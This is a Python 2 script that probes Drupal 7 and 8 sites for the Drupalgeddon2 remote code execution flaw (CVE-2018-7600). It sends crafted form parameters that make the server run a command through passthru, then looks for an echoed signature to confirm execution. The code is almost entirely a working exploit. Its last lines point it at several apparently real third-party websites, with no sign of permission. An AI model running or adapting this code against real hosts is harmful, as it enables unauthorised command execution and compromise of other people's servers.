import requests
import re
import bb01_ultilities as ulti

# Fuction to check if the exploited form is avaiable
# - RETURN:
#     True: if the form can be connected
#     False: if the form can be connected
#     newURL -> string: if the form is redirected to other


def processRedirectedURL(url,version):
    print 'Redirected ' + url
    headers = ulti.genHeader()
    form_id = '/user/password' if version[:1] == '7' else '/user/register'
    if ('profile=default' in url):
        return True

    if('?q=' in url and version is '8'):
        print "Case q8"
        return False

    if('?q=user/password' in url and version is '7'):
        print "Case q7"
        url = url[:-16]
        return isPwnAbleWithQ(url)

    if(form_id in url):
        print "Case form in url"
        url = url[:-14]
        if(version is '8'):
            return exploitD8(url)
        elif(version is '7'):
            return exploitD7Clean(url)
        else:
            return False

    res = requests.get(url, headers=headers, timeout=5)
    if ('user_pass' not in res.text and 'user_form' not in res.text):
        print "Case brand new"
        # return isVuln(url,version)
        return False
    
    return False

def isFormValid(host, version):
    if(host[-1:] != '/'): host+= '/'
    form_id = 'user/password' if version[:1] == '7' else 'user/register'
    urlq = host + '?q=' + form_id
    url = host + form_id

    check = ulti.checkURLStatus(url)
    if(check is True):
        return 'cleanURL enable'
    elif(check is not False):
        return 'Redirected' + check

    if version[:1] == '8':
        return False
    else:
        check = ulti.checkURLStatus(urlq)
        if(check is True):
            return 'cleanURL disable'
        if (check is not False):
            return 'Redirected' + check

    return False

def isPwnAbleWithQ(host):
    signature = ulti.genSignature()
    get_params = {'q': 'user/password', 'name[#post_render][]': 'passthru',
                    'name[#type]': 'markup',
                    'name[#markup]': 'echo ' + signature}
    post_params = {'form_id': 'user_pass',
                    '_triggering_element_name': 'name'}
    try:
        r = requests.post(host, data=post_params,
                            params=get_params, verify=False,timeout = 20)
    except Exception as e:
        print e
        return False
    m = re.search(r'<input type="hidden" name="form_build_id"'
                    ' value="([^"]+)"', r.text)
    if m:
        found = m.group(1)
        get_params = {'q': 'file/ajax/name/#value/' + found}
        post_params = {'form_build_id': found}
        res = requests.post(host, data=post_params, params=get_params)
        detect = bool(re.search(signature, res.text))
        n = bool(re.search('echo ' + signature, res.text))
        if detect and not n:
            return True
    else:
        return False

def exploitD7Clean(host):
    signature = ulti.genSignature()
    if(host[-1:] != '/'): host+= '/'
    url = host + 'user/password'
    get_params = {'name[#post_render][]': 'passthru',
                    'name[#type]': 'markup',
                    'name[#markup]': 'echo ' + signature}
    post_params = {'form_id': 'user_pass',
                    '_triggering_element_name': 'name'}
    try:
        r = requests.post(url, data=post_params,
                            params=get_params, verify=False)
    except Exception as e:
        print e
        return False
    m = re.search(r'<input type="hidden" name="form_build_id"'
                    ' value="([^"]+)"', r.text)
    if m:
        found = m.group(1)
        url = ''.join([host, 'file/ajax/name/%23value/', found])
        post_params = {'form_build_id': found}
        # post url, not host
        res = requests.post(url, data=post_params)
        detect = bool(re.search(signature, res.text))
        n = bool(re.search('echo ' + signature, res.text))
        if detect and not n:
            return True
        else:
            return False
    else:
        return False

def exploitD8(host):
    signature = ulti.genSignature()
    url = ulti.genURLD8(host)
    post_params = {'form_id': 'user_register_form', '_drupal_ajax': '1',
                    'mail[a][#post_render][]': 'passthru',
                    'mail[a][#type]': 'markup',
                    'mail[a][#markup]': 'echo ' + signature}
    try:
        res= requests.post(url, data=post_params, verify=False, timeout = 50)
    except Exception as e:
        print e
        return False
    detect = bool(re.search(signature, res.text))
    n = bool(re.search('echo ' + signature, res.text))
    if detect and not n:
        return True
    else:
        return False

def isPwnAbleClean(host, version):
    if version == '7':
        return exploitD7Clean(host)

    if version == '8':
        return exploitD8(host)
    
    else: 
        return False


def isVuln(host, version):
    version = version[:1]
    formStatus = isFormValid(host, version)
    if(formStatus is False):
        return False
    elif('enable' in formStatus):
        # print 'CleanURL Enable'
        return isPwnAbleClean(host,version)
    elif('disable' in formStatus):
        # print 'CleanURL Disable'
        return isPwnAbleWithQ(host)
    elif('Redirected' in formStatus):
        # print 'Redirected'
        return processRedirectedURL(formStatus[10:],version)
    else:
        return False

def check_CVE_7600(host, version):
    try:
        res = isVuln(host, version)
    except Exception as e:
        print e
        return False
    return res


host = 'http://lythuyetlaixe.com/'
host = 'http://paradise-mass.lviv.ua/'
# host = 'http://192.168.210.133'
# # # host = 'https://whatchareadin.de'
# # # host = 'http://autoshares.com/'
version = '7.44'
# version = '8.2'
# # # ver = '8.2'
# # print 'Testing: ', host
# # print '=' * 25
print isVuln(host,version)
# # formStatus = isFormValid(host,version)
# # if('Redirected' in formStatus):
# #     print 'Redirected'
